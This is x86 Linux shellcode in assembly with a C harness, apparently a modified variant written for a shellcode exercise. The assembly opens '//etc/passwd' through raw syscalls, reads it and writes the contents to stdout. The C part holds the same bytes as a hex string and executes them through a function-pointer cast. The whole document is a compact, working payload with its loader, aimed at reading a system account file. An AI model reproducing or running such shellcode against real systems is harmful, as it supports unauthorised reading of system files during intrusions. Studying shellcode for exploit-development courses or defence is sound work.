global _start

section .text

_start:

        xor ecx,ecx             ; expanded the clearing of 3 registers
        xor eax, eax
        xor edx, edx 
        mov al,0x5 
        push edx            ; Switched to any cleared register since we are just pushing a NULL onto the stack
        push dword 0x64777373
        push dword 0x61702f63
        push dword 0x74652f2f
        mov ebx,esp 
        int 0x80 
        xchg eax,ebx 
        xchg eax,ecx 
        mov al,0x3  
        mov dx,0xfff            ; Deleted previous line of "xor edx, edx" as edx was already zeroed out
        inc edx 
        int 0x80 
        xchg eax,edx 
        xor eax,eax 
        mov al,0x4 
        mov bl,0x1 
        int 0x80 
        xchg eax,ebx 
        int 0x80 

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc9\x31\xc0\x31\xd2\xb0\x05\x52\x68\x73\x73\x77\x64\x68"
"\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x93\x91"
"\xb0\x03\x66\xba\xff\x0f\x42\xcd\x80\x92\x31\xc0\xb0\x04\xb3"
"\x01\xcd\x80\x93\xcd\x80";


int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

